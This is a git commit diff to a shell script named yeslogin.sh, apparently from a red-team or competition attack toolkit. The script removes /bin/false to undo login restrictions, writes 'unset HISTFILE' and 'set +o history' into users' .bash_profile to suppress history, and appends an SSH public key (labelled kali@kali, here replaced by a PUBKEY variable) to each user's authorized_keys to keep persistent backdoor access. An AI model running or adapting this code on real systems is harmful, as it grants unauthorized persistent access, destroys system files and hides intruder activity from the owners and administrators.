781c3b2c7f77b101b1c56e04d5bd479d16713545
vaughnw128 <vww9966@rit.edu>
2023-10-19 14:53:23 -0400

    update

--- src/modules/yeslogin.sh
+++ src/modules/yeslogin.sh
@@ -9,6 +9,7 @@ fi
 echo "=== Removing login restrictions and generating SSH keys ==="
 
 # Make sure to set pubkey
+PUBKEY='pubkey'
 
 # Remove nologin bins
 rm /bin/false 2> /dev/null
@@ -28,7 +29,7 @@ for homedir in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -
     touch $homedir/.bash_profile 2> /dev/null
     echo 'unset HISTFILE' >> $homedir/.bash_profile 2> /dev/null
     echo 'set +o history' >> $homedir/.bash_profile 2> /dev/null
-    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhemdnKj/KZTHsIrdVYFF4kXBiq8hnkEQg2y5TVooqF7KZvzL62BmHVFKteiFlEjObZ6oe9FK8kZ2CNnduaGvHyOSR7VcwQIv9yxWvjpcZV9vl3EeeSLg7j8KYDJcGCjJ4Fp8tms52y2/fKYxBxIjQrd+XLjeNjm2RDHPyGotGkrIQCaePv9qsuJLLHOsGTExZlEZV6Znk7ka0Q8m68QdV46PaCfm6Na+bkgkrU9IFYXkbU6tsd79lgr+q9qoGPx438xOcSeorp9LLBy2Pc0/rIB4bhMqBO+vmKEKgc9mmpgku4+HSshUGy1e07FFvHZ9VTfhmVay8UgZ2pOjCQdw5d7CYTl32S9hUQ2fCAXEMuZRyjHXBwPuv6Kty4ZPCWq7N3GRZNd4zJ++5h4ha0Z5+L3e+IYncEs4lr8Lf5lB8zgxbtrDV+Dg4BnWrgvMGiaUpLR/v7IPv/58Tx6p0/CyHFuEdFlPjKoo4rtOJcx59jw6ky3/n7EOKcV5MHtszkfs= kali@kali' >> $homedir/.ssh/authorized_keys
+    echo $PUBKEY >> $homedir/.ssh/authorized_keys
     echo "Wrote creds to $homedir"
 done
 
